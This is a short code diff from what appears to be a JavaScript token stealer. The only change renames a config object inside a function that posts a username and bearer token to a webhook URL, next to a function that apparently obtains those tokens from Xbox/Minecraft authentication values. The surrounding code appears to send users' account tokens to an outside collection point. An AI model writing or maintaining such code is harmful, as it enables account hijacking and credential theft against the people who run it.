@@ -103,7 +103,7 @@ async function getBearerTokenAndUsername(xstsToken, userHash) {
 }
 
 function postToWebhook(username, bearerToken) {
-    const url = config.webhook_url
+    const url = myconfig.webhook_url
     const headers = {
         'Content-Type': 'application/json',
     }
